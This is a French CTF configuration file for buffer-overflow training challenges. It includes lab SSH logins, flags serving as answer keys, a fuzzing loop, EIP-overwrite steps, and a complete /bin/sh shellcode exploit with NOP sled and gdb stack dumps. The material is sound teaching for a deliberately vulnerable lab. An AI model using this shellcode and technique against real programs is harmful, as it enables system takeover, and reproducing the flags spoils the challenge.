#
# ctf-buffer
#
# Configuration des challenges
#
# [XXX] Label du challenge, doit être unique, sans contrainte particulière
# name: Home Sweet Home : Nom du challenge tel qu'il apparait sur les pages HTLM
# value: 10 : Nombre de points marqués pour la résolution du challenge
# category: Ghost in the Shell : Catégorie regroupant plusieurs challenges
# flag: flag_{m0n_pr3m13r_fl4g} : format libre
# file: (optionnel) : le nom d'un fichier qui sera téléchargeable par les participants.
# description: 
#    La description peut tenir sur une ou plusieurs lignes.
#    [espace !!] Les lignes de la description doivent commencer par un ESPACE ou une TABULATION
#    Dès qu'une ligne recommence à la première colonne, on a terminé la description
#    Cette description est collée dans du HTML après un passage dans un léger parser Markdown
#    Utiliser la balise </br> pour chaque retour à la ligne
#    Mettre les morçeaux de code ou commande entre deux lignes de ```
#    ```
#    $ commande shell, ou bout de code
#    ```



[Intro]
category: Buffer overflows
label: Buffer overflows
docker: ctf-buffer
description: 
    ## Buffer overflows   
    .
    Quand vous saisissez votre nom, votre mail, un message, le programme doit leur réserver une place pour les stocker quelque part en mémoire.   
    Quand vous envoyez une requète HTTP, le serveur doit la stocker, l'analyser, décoder les champs en base64...
    .
    Dans son programme, John a besoin de saisir une adresse mail. Il va réserver un buffer de 1024 octets. Ca peut sembler généreux...
    Notre job, c'est de trouver ces fonctions et leur envoyer un mail de 2000 octets... Qui vont venir écraser la mémoire, et les variables qui s'y trouvent.
    On peut ainsi injecter du code et prendre la main sur le système.
    Ces vulnerabilités sont caractéristiques des programmes en C... qui reviennent en masse dans les objets connectés.
    .
    Pour trouver un buffer overflow, on utilise un fuzzer qui injecte des données aléatoires partout ou c'est possible.
    Pour exploiter un buffer overflow, il faut un minimum de connaissance de la structure en mémoire des programmes, de l'utilisation des adresses et registres. Et savoir ou trouver les bonnes payload pour son système.
    Linux dispose de protection contre le buffer Overflow. On commence par les désactiver, et on les réactive au fur et à mesure pour monter la difficulté.
    Nos buffers overflow permettent de toucher du doigt le principe sans mettre les mains dans l'assembleur.
    .
    Pour se former :
    Tutoriel par Hack'n do [https://beta.hackndo.com/buffer-overflow/]
    
    
    


[Challenge_1]
name:  Ca dépasse !! 
value: 10
file:  buffer_01.c
category:  Buffer overflows
flag:  flag{J3_su1s_tr0p_d3b0rd3}
description: 
    ```
    ssh bender@IPSERVER         
    mdp: leelu
    ```
    Le programme say_hello vient de remporter le concours de l'IA la plus futée du MIT. Malheureusement ses concepteurs se sont concentrés sur les performances du CPU et un peu négligé la sécurité.
    Jette un oeil a son source: buffer_01.c
    ```
    $ ./say_hello bob
    ```
    Remplace bob par 12345678901234567890.
    Ca dépasse des 10 caractères alloués au tableau name.
    Et ça va écraser le tableau intro[10]="Hello";
    Si nous continuons, nous pouvons écraser la variable tst, et forcer un appel à print_flag();




[Challenge_2]
name:  Baisse la tête
value: 15
file:  buffer_02.c
category:  Buffer overflows
flag:  flag{c4_d3p3nd_c4_d3p4ss3_t0uj0urs}
description: 
   ```
    ssh leela@IPSERVER         
    mdp: yivo
    ```
    Les programmeurs ont sorti une version 2 de leur IA, avec une sécurité renforcée.
    Jette un oeil a son source: buffer_02.c
    .
    Il faut forcer la valeur de tst à 'Z' pour déclencher un appel à print_flag();
    




[Challenge_3]
name:  Sec Check
value: 20
file:  buffer_03.c
category:  Buffer overflows
flag:  flag{3t_3n_t4ss4nt_un_p3u}
description: 
   ```
    ssh philip@IPSERVER         
    mdp: elzar
    ```
    Alertés par la communauté, et sous la pression des investisseurs qui détestent le bad nuzz, les programmeurs ont sorti une version 3 de leur IA, toujours plus sécure.
    Jette un oeil a son source: buffer_03.c
    .
    Il faut forcer la valeur de tst à 'SecCheck' pour déclencher un appel à print_flag();
    




[Challenge_overflow1]
name:  Fuzzer
value: 20
file:  buffer_04.c
category:  Buffer overflows
flag:  1008
description: 
   ```
    ssh fry@IPSERVER         
    mdp: futur
    ```
    Pour detecter les buffer overflow, nous utilisons de fuzzers: des logiciels qui vont générer de grandes quantités de données.
    Il existe des fuzzers plus ou moins sophistiqués.
    Nous allons ici utiliser un fuzzer basique: un script shell et python qui va générer une chaine de A de longueur variable.
    .
    Dans le code source, nous voyons que la taille du buffer est de 1000 caractères. Nous allons tester des chaines de A entre 995 et 1020 caractères.
    ```
    Segmentation fault 
    ```
    Des que nous avons ce message, c'est gagné !
    .
    Le flag est la taille de la chaine qui génère un buffer overflow.
    ```
    for i in `seq 990 1015`; do echo $i; ./say_hello4 $(python -c "print 'A'*$i"); done;
    ```


[Challenge_overflow2]
name:  EIP control
value: 20
file:  buffer_04.c
category:  Buffer overflows
flag:  1012
description: 
   ```
    ssh fry@IPSERVER         
    mdp: futur
    ```
    Dans le challenge précédent, nous avons généré un buffer overflow.
    Dans celui-ci nous allons prendre le control sur l'execution des instructions
    .
    Les programmes rangent le code à éxécuter dans une partie de la mémoire, et leurs données dans une autre zone.
    Pour notre plus grand plaisir, le register EIP qui pointe vers le prochaine instruction de code à executer sauve régulièrement sa valeur parmis les données.
    En écrasant les valeurs des données avec un buffer overflow, nous pouvons écraser la valeur d'EIP et forcer l'adresse de la prochaine instructionà executer. 
    Nous allons progressivement augmenter la taille de notre chaine de 'AAAA' jusqu'à ce qu'elle pousse 'BBBB' dans EIP.
    Nous voyons la valeur d'EIP dans le message d'erreur nous disant que l'adresse est invalide.
    BBBB va s'écrire 0x42424242

    ```
    Program received signal SIGSEGV, Segmentation fault.
    0x00424242 in ?? () - On y est presque
    Program received signal SIGSEGV, Segmentation fault.
    0x42424242 in ?? () => On y est
    Program received signal SIGSEGV, Segmentation fault.
    0x42424241 in ?? () - On a trop poussé, un A apparait
    ```
    Le flag est la taille de la chaine qui permet d'écrire BBBB dans EIP.
    ```
     for i in `seq 1008 1020`; do echo $i; gdb -batch -ex='run' -args ./say_hello4 $(python -c "print 'A'*$i+'BBBB'"); done;

    ```
    
    


[Challenge_overflow3]
name:  dash
value: 50
file:  buffer_04.c
category:  Buffer overflows
flag:  1012
description: 
   ```
    ssh fry@IPSERVER         
    mdp: futur
    ```
    Dans les deux  challenges précédent, nous avons généré un buffer overflow, et pris le controle du pointeur vers la prochaine instruction à executer.
    Dans celui-ci nous allons injecter nos propres instructions à executer: notre payload.
    Ces instructions sont des suites de commandes en assembleur.
    Il en existe de toutes prêtes sur : [http://shell-storm.org/shellcode/]
    ```
    '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'
    ```
    Notre payload va executer l'appel system(/bin/sh) pour ouvrir un shell.
    Elle fait 45 caractères de long.
    Nous allons ajouter des instructions assembleur NOP devant cette payload pour atteindre 112 caractères.
    L'instruction NOP veut juste dire 'ne fais rien' et passe à l'instruction suivante.
    Elle s'écrit 0x90 en assembleur.
    Suite de NOP est une suite de 0x90909090 en mémoire, on parle d'une rampe de NOP - ROP Sledge
    Nous allons faire pointer l'adresse de la prochaine instruction au milieu de ces NOP.
    .
    Nous allons récupérer l'adresse de ces NOP à l'aide du débogueur gdb.
    Le binaire a été compilé avec des options de débogage, ça nous simplifie la vie. 
    Nous plaçons un point d'arret à la ligne 17, lançons l'execution du programme, puis demandons d'affichage des données (la Stack).

    ```
    gdb -batch -ex='unset env LINES' -ex='unset env COLUMNS' -ex='b 17' -ex='run' -ex='x/300x $esp' -args  ./say_hello4 $(python -c "print '\x90'*(1012-45)+'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'+'BBBB'")
    Breakpoint 1 at 0x577: file buffer_04.c, line 17.

    17	    printf("Hello %s\n", buffer);
    0xffffc950:	0x00000001	0x00000001	0x90909090	0x90909090
    0xffffc960:	0x90909090	0x90909090	0x90909090	0x90909090
    0xffffc970:	0x90909090	0x90909090	0x90909090	0x90909090
    0xffffc980:	0x90909090	0x90909090	0x90909090	0x90909090
    0xffffc990:	0x90909090	0x90909090	0x90909090	0x90909090
    (...)   
    0xffffcb70:	0x90909090	0x90909090	0x90909090	0x90909090
    0xffffcb80:	0x90909090	0x90909090	0x90909090	0x90909090
    0xffffcb90:	0x90909090	0x90909090	0x90909090	0x90909090
    (...)  
    0xffffcd00:	0x90909090	0x90909090	0x90909090	0x90909090
    0xffffcd10:	0xeb909090	0x76895e1f	0x88c03108	0x46890746
    0xffffcd20:	0x890bb00c	0x084e8df3	0xcd0c568d	0x89db3180
    0xffffcd30:	0x80cd40d8	0xffffdce8	0x69622fff	0x68732f6e
    0xffffcd40:	0xffffc9b0	0x00000000	0xffffcd68	0x565555e9
    0xffffcd50:	0xffffcfe4	0xffffce14	0xffffce20	0x565555aa
    0xffffcd60:	0xffffcd80	0x00000000	0x00000000	0xf7df8e81
    0xffffcd70:	0xf7fb5000	0xf7fb5000	0x00000000	0xf7df8e81
    0xffffcd80:	0x00000002	0xffffce14	0xffffce20	0xffffcda4
    0xffffcd90:	0x00000002	0xffffce14	0xf7fb5000	0xf7fe575a
    0xffffcda0:	0xffffce10	0x00000000	0xf7fb5000	0x00000000
    0xffffcdb0:	0x00000000	0x112f2cfd	0x51a8aaed	0x00000000
    0xffffcdc0:	0x00000000	0x00000000	0x00000040	0xf7ffd024
    0xffffcdd0:	0x00000000	0x00000000	0xf7fe5869	0x56556fd4
    0xffffcde0:	0x00000002	0x56555410	0x00000000	0x56555441
    0xffffcdf0:	0x56555596	0x00000002	0xffffce14	0x56555600
    ```
    Nous avons ci-dessus le dump mémoire de la zone de donnée.
    .
    La colonne de gauche donne les adresses, les 4 colonnes de droite le contenu de la mémoire.
    On retrouve bien les 967 NOP, puis la payload, et enfin l'adresse de la prochaine instruction.
    .
    Nous allons prendre une adresse au milieu de la zone des NOP, et la saisir à la place de BBBB.
    Nous prenons une adresse au milieu de la zone de NOP, car le début exact de la zone des données va changer entre un process 'normal' et le même process sous déboggeur.
    L'adresse exacte dépend entre autre des variables d'environnement. Une adresse au milieu de la zone nous permet d'avoir un peu de marge.
    Petites contraintes: Cette adresse ne doit pas contenir la caractère 00, et elle va s'écrire à l'envers.
    Et sur un processeur i386, les adresses s'écrivent la partie de poid faible à gauche.

    Prenons par exemple l'adresse: 0xffffcb90
    Elle va s'écrire '\x90\xcb\xff\xff'
   
    ```
    gdb -batch -ex='unset env LINES' -ex='unset env COLUMNS' -ex='run' -args  ./say_hello4 $(python -c "print '\x90'*(1012-45)+'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'+'\x90\xcb\xff\xff'")

    ```
    .
    Le flag s'affichera quand vous obtiendrez votre shell.
    
    



